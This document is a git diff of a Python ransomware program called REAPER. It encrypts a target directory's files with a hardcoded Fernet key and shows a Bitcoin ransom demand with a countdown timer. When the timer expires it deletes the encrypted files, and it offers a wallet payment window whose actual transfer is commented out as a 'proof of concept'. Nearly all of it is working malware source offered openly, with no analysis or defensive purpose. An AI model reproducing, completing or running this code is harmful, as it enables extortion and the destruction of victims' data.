@@ -1,12 +1,18 @@
 # The reaper ransomware 8========D
-from cryptography.fernet import Fernet
 import os,sys,json,time
+from cryptography.fernet import Fernet
 from tkinter import *
 from bitcoinlib.wallets import Wallet
 
+# Variables to be changed 
+DIR = "C:/Users/krist/Documents/todo_list"
+TARGET_WALLET = "your wallet here"
+AMOUNT_OF_BITCOIN = 0.061
+KEY = b"oZLDJpM0ziURf6KW_EjAzBBLnSTYBrI5GxUGfTstJMQ="
+
 # Variables
-DIR = "C:/Users/krist/Documents/beatmaker"
 dirs = []
+JSON_FILE = "ext.json"
 COLORS = {
   "hacker_green": "\033[1;32;40m",
   "red": "\033[1;31;40m",
@@ -26,7 +32,7 @@ banner = f"""
                               | $$                          
                               |__/                          
 {COLORS["white"]}"""
-RANSOM_TEXT = """ 
+RANSOM_TEXT = f""" 
 This is the REAPER ransomware.
 
 DO NOT CLOSE THIS WINDOW!
@@ -35,25 +41,56 @@ the computer powered off you will not be able to send
 the Bitcoin which will result in you not getting the 
 encryption key and the files back.
 
-Pay for the ransom to be removed.
-The payment must be in Bitcoin.
-Once you paid all files will be back to normal.
-If instructions are not followed all files will be deleted.
+Also do not delete 'ext.json' that contains data about
+your files.
 
-Click on 'Pay' and follow the instructions.
+Pay for the ransom to be removed {AMOUNT_OF_BITCOIN} Bitcoin.
+The payment must be in Bitcoin.
+Once you paid, all files will be back to normal.
+If instructions are not followed all files will be deleted
+
+Click on 'Go ahead' and follow the instructions.
 """
+PAYMENT_INSTRUCTIONS =  """ 
+Instructions:
+ - Create new wallet
+ - Send money to the new wallet
+ - Press 'Pay' to send money and get the encryption key
+"""
+
+# Method for creating tkinter labels
+def create_tkinter_label(name,root,text,color,font_size):
+  name = Label(root,text=text, bg="black", fg=color, font=("Courier", font_size))
+  name.pack()
+
+# Method for creating tkinter buttons
+def create_tkinter_button(name,root,text,color,font_size,command):
+  name = Button(root, text=text, bg="#606060", fg=color,font=("Courier", font_size), command=command)
+  name.pack()
+
+# Method for creating tkinter entries
+def create_tkinter_entry(name,root,color,font_size):
+  name = Entry(root, bg="#606060", fg=color, font=("Courier", font_size))
+  name.pack()
+
+# Method to decrypt the ext.json file
+def decrypt_json(fernet):
+  json_file = open(JSON_FILE, "rb")
+  json_content = json_file.read()
+  json_file.close()
+  file = open(JSON_FILE, 'wb')
+  file.write(fernet.decrypt(json_content))
+  file.close()
 
 # The file rewriting class
 class TakeOver():
   def __init__(self):
     print(banner)
     # Encrypt file
-    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
-    self.fernet = Fernet(self.key) 
+    self.fernet = Fernet(KEY) 
     self.file_data = {}
     #The DIR to start with
-    self.dir = DIR
-    self.destruct(self.dir)
+    self.destruct(DIR)
 
   # Taking over the files
   def destruct(self,directory):
@@ -89,15 +126,23 @@ class TakeOver():
       self.file_data[str(ENC_FILE)] = ext
       with open('ext.json', 'w') as a:
         json.dump(self.file_data, a)
-     
+    # Encrypting JSON file
+    json_file = open(JSON_FILE, "rb")
+    json_file_content = json_file.read()
+    json_file.close()
+    file = open(JSON_FILE, 'wb')
+    file.write(self.fernet.encrypt(json_file_content))
+    file.close()
+      
 # Decrypt files
 class TakeBack():
   def __init__(self):
     print(banner)
     # Get encryption key
-    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
-    self.fernet = Fernet(self.key)
-    with open("ext.json") as files:
+    self.fernet = Fernet(KEY)
+    # Decrypt json file
+    decrypt_json(self.fernet)
+    with open(JSON_FILE) as files:
       self.ENC_FILES = json.load(files)
     for i in self.ENC_FILES:
       # Put old extension back to the file
@@ -121,13 +166,14 @@ class TakeBack():
       except PermissionError:
         pass
     print("Files are back to normal, REAPER is quitting...")
-    os.remove("ext.json")
+    os.remove(JSON_FILE)
 
 # Class for the countdown timer window
 class TimerWindow():
   def __init__(self): 
     # Max time to pay ransom
-    self.secs = 86400
+    #self.secs = 86400
+    self.secs = 9
     # Window
     self.root = Tk()
     self.root.resizable(False,False)
@@ -135,20 +181,16 @@ class TimerWindow():
     self.root.title("REAPER - COUNTDOWN")
     self.root.configure(bg="black")
     # Reaper text
-    rpr_label = Label(self.root, text="\nREAPER", fg="#00FF00",bg="black", font=("Courier", 60,))
-    rpr_label.pack()
+    create_tkinter_label("rpr_label",self.root,"\nREAPER","#00FF00",60)
     # Countdown timer
     self.c_time = StringVar()
     self.c_time.set(self.secs)
     self.timer = Label(self.root, textvariable=self.c_time,bg="black", fg="#00FF00", font=("Courier", 25))
     self.timer.pack()
     # Explanation
-    exp = Label(self.root, text=RANSOM_TEXT, fg="#00FF00",bg="black", font=("Courier", 12,), anchor='center')
-    exp.pack()
+    create_tkinter_label("exp",self.root,RANSOM_TEXT,"#00FF00",12)
     # Bitcoin button
-    pay_btc_btn = Button(self.root, text="Pay", fg="#00FF00",
-                         bg="#404040", font=("Courier", 20))
-    pay_btc_btn .pack()
+    create_tkinter_button("pay_btc_btn", self.root, "Go ahead","#00FF00",20,Payment)
 
   # Method to decrease timer
   def decrease_time(self):
@@ -162,22 +204,76 @@ class TimerWindow():
 
   # Method to delete all files
   def delete_all_files(self):
+    self.fernet = Fernet(KEY)
+    # Decrypt json file
+    decrypt_json(self.fernet)
+    # Remove files
     print(f"{COLORS['red']}No ransom was paid, deleting files...{COLORS['white']}")
-    with open("ext.json") as files:
+    with open(JSON_FILE) as files:
       self.files = json.load(files)
     for i in self.files:
-      os.remove(i)
+      try:
+        os.remove(i)
+      except PermissionError:
+        pass
       print(f"Deleting: {i}")
-    os.remove("ext.json")
+    os.remove(JSON_FILE)
     sys.exit()
 
+class Payment():
+  # Window
+  def __init__(self):
+    self.root = Tk()
+    self.root.resizable(False, False)
+    self.root.geometry("800x800")
+    self.root.title("REAPER - PAYMENT & ACCOUNT")
+    self.root.configure(bg="black")
+    # Reaper text
+    create_tkinter_label("rpr_label", self.root, "\nREAPER", "#00FF00", 60)
+    # Disclaimer
+    create_tkinter_label("f", self.root,"Follow the instructions to get the encryption key\n", "#00FF00", 15)
+    # Instructions
+    create_tkinter_label("inst",self.root, PAYMENT_INSTRUCTIONS,"#00FF00",15)
+    # Wallets
+    create_tkinter_label("wallet_name_lbl", self.root,"Your wallet's name", "#00FF00",15)
+    self.wallet_name = Entry(self.root,fg="#00FF00", bg="black", font=("Courier",20))
+    self.wallet_name.pack()
+    # Payment button
+    self.acc = Button(self.root, text="Make new account", fg="#00FF00",bg="#404040", font=("Courier", 20), command=self.new_wallet)
+    self.acc.pack()
+    self.root.mainloop()
+    
+  # Wallet creation
+  def new_wallet(self):
+    self.wallet = Wallet.create(self.wallet_name.get())
+    self.wallet_key = self.wallet.get_key()
+    self.acc.destroy()
+    create_tkinter_label("wallet_addr", self.root,f"Your address:\n{self.wallet_key.address}", "#00FF00", 11)
+    create_tkinter_button("pay", self.root, "Pay","#00FF00", 20, self.send_bitcoin)
+
+  # Transaction
+  def send_bitcoin(self):
+    """
+    # Uncomment these if you want the transaction to take place.
+    Also it might not work since I do not have Bitcoin to try it.
+    It's a proof of concept anyways.
+
+    self.wallet.scan()
+    self.transaction = self.wallet.send_to(TARGET_WALLET, AMOUNT_OF_BITCOIN)
+    print(self.transaction.info())
+    """
+    self.decrypt()
+
+  def decrypt(self):
+    TakeBack()
+    sys.exit()
+    
+# Calling classes
 if sys.argv[1] == "-t":
-  REAPER = TakeOver()
-elif sys.argv[1] == "-r":
-  TAKER = TakeBack()
-else:
+  r = TakeOver()
   t = TimerWindow()
   t.decrease_time()
   t.root.mainloop()
+else:
   print("Wrong parameters...")
-  #sys.exit()
+  sys.exit()
